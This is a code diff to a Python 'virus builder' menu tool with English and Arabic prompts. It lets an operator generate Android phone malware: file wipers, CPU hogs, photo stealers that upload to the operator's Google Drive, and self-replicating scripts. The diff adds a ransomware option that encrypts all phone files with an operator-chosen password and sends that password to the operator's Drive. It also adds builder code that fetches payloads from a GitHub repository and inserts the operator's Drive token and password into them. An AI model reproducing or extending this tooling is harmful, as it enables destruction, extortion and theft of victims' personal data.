@@ -37,7 +37,7 @@ R = ('\033[31m')
 W = ("\033[97m")
 import os
 
-va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py']
+va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
 print(W+'''
 	.____.
    xuu$``$$$uuu.
@@ -117,7 +117,6 @@ def check_for_modifications():
         if current_script_hash != stored_script_hash:
 
             os.remove(script_path)
-            #os.remove(va[0]+va[1]+va[2]+va[3]+va[4]+va[5])
             for file_name in va:
             	if os.path.isfile(file_name):
             		os.remove(file_name)
@@ -136,7 +135,7 @@ def op():
 	    os.system('pip3 install requests')
 	    import webbrowser,wget,requests
 
-	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/1.8v'
+	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/1.9v'
 	
 	
 	response = requests.get(url)
@@ -168,7 +167,7 @@ def op():
 		import wget
 		
 		base_url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/'
-		va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py']
+		va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
 		
 		for file_name in va:
 		    file_path = os.path.join(os.getcwd(), file_name)
@@ -188,14 +187,16 @@ def op():
 		print(R+'《3》'+W+"This virus steals all the victim's photos and sends them to your google drive (but you need token for google drive)")
 		print(R+'《4》'+W+'This virus creates insanely hidden files in the sdcard really fast')
 		print(R+'《5》'+W+'This virus copies itself over and over again inside file scripts such as text, etc')
+		print(R+'《6》'+W+'The virus encrypts all phone files with a password that you specify, and the password is saved in the Password.txt file, and the Password.txt file is sent to your account on Google Drive')
 		print(G+'《1》'+W+'يقوم الفيروس الأول بحذف جميع ملفات الهاتف ، بما في ذلك الصور والتسجيلات الصوتية وغيرها')
 		print(G+'《2》'+W+'يقوم الفيروس بالضغط على الجهاز ويعلقه ويضغط على معالج الجهاز')
 		print(G+'《3》'+W+"يسرق هذا الفيروس جميع صور الضحايا ويرسلها إلى حسابك على google drive  (لكنك تحتاج إلى الـtoken لـ google drive الخاص بك)")
 		print(G+'《4》'+W+'يقوم هذا الفيروس بإنشاء ملفات مخفية بسرعة كبيرة ولا يمكن للضحية رؤيتها')
 		print(G+'《5》'+W+'يقوم هذا الفايروس بنسح نفسه مراراً وتكراراً بداخل سكربتات الملفات مثل النصوص او وغيرها')
-		Virus00=str(input("\033[31m ┌─["+LIGHTGREEN_EX+"𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀 "+BLUE+"~"+R+"@"+W+"𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 "+R+"""]
+		print(G+'《6》'+W+'يقوم الفايروس بتشفير جميع ملفات الهاتف ب باسوورد انت تقوم بتحديده ويتم حفظ الباسورد بملف Password.txt ويتم إرسال ملف Password.txt لحسابك على Google Drive ')
+		Virus00=str(input("\033[31m ┌─["+LIGHTGREEN_EX+"𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀  "+BLUE+"~"+R+"@"+W+"𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 "+R+"""]
  └──╼ """+W+"$ "))
-		if not Virus00.isdigit() or int(Virus00) not in [1, 2, 3, 4, 5]:
+		if not Virus00.isdigit() or int(Virus00) not in [1, 2, 3, 4, 5, 6]:
 			    os.system('clear')
 			    print('The character you entered does not exist. Please choose from the following numbers:\n1\n2\n3\n4\n5')
 			    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n1\n2\n3\n4\n5')
@@ -225,6 +226,23 @@ def op():
 				original = r'.delet_virus1.py'
 				target = r'.delet_virus.py'
 				os.rename(original, target)
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
 			########
 			##Virus2##
 			########
@@ -253,6 +271,23 @@ def op():
 				original = r'.crash_virus1.py'
 				target = r'.crash_virus.py'
 				os.rename(original, target)
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
 		if Virus00 == "3":
 				BLUE = ("\033[34m")
 				GREN = ('\033[92m')
@@ -293,6 +328,23 @@ def op():
 				original = r'.Open1.py'
 				target = r'.Open.py'
 				os.rename(original, target)
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
 		if Virus00 == "4":
 				BLUE = ("\033[34m")
 				GREN = ('\033[92m')
@@ -318,6 +370,23 @@ def op():
 				original = r'.config_virus1.py'
 				target = r'.config_virus.py'
 				os.rename(original, target)
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
 		if Virus00 == "5":
 				BLUE = ("\033[34m")
 				GREN = ('\033[92m')
@@ -342,5 +411,105 @@ def op():
 				original = r'.spreading_virus1.py'
 				target = r'.spreading_vrius.py'
 				os.rename(original, target)
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
+		if Virus00 == "6":
+				BLUE = ("\033[34m")
+				GREN = ('\033[92m')
+				White = ("\033[97m")
+				RED = ("\033[31m")
+				LIGHTGREEN_EX = ('\033[92m')
+				import shutil	
+				Open = r'.encrypted_virus.py'
+				Open1 = r'.encrypted_virus1.py'
+				shutil.copyfile(Open, Open1)
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+ └──╼ """+White+"$ ")
+				password = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Password Encrypted"+RED+"""]
+ └──╼ """+White+"$ ")
+				import webbrowser
+				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
+				webbrowser.open(url)
+				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
+				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
+				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
+ └──╼ """+White+"$ ")
+ ###########################
+ ##########Ecrypted##########
+ ###########################
+				with open('.encrypted_virus.py', 'r') as file :
+					filedata = file.read()
+					filedata = filedata.replace('abcde', nun)
+					filedata = filedata.replace('abcde', password)
+				#########
+				with open('.encrypted_virus.py', 'w') as file:
+				 file.write(filedata)
+				 ########
+				 old_name = r".encrypted_virus.py"
+				 new_name = (new + '.py')
+				#############
+				os.rename(old_name, new_name)
+				############
+				import os
+				original = r'.encrypted_virus1.py'
+				target = r'.encrypted_virus.py'
+				os.rename(original, target)
+ ###########################
+ ##########Decrypted##########
+ ###########################
+				Open = r'.decrypted_virus.py'
+				Open1 = r'.decrypted_virus1.py'
+				shutil.copyfile(Open, Open1)
+				with open('.decrypted_virus.py', 'r') as file :
+					filedata = file.read()
+					filedata = filedata.replace('abcde', password)
+				#########
+				with open('.decrypted_virus.py', 'w') as file:
+				 file.write(filedata)
+				 ########
+				 old_name = r".decrypted_virus.py"
+				 new_name = (new + '_decrypted.py')
+				#############
+				os.rename(old_name, new_name)
+				############
+				ascii()
+				print(White+'The virus has been saved as ' +RED+ new + '.py')
+				import os
+				original = r'.decrypted_virus1.py'
+				target = r'.decrypted_virus.py'
+				os.rename(original, target)
+#################################
+				def restart():
+				    while True:
+				        import os
+				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+ └──╼  """+White+"(y/n) ? ")
+				        if restart == "y":
+				            import os
+				            os.system('clear')
+				            run()
+				          #  break
+				        elif restart == "n":
+				            exit()
+				        else:
+				            os.system('clear')
+				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
+				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+				restart()
 	run()
 op()
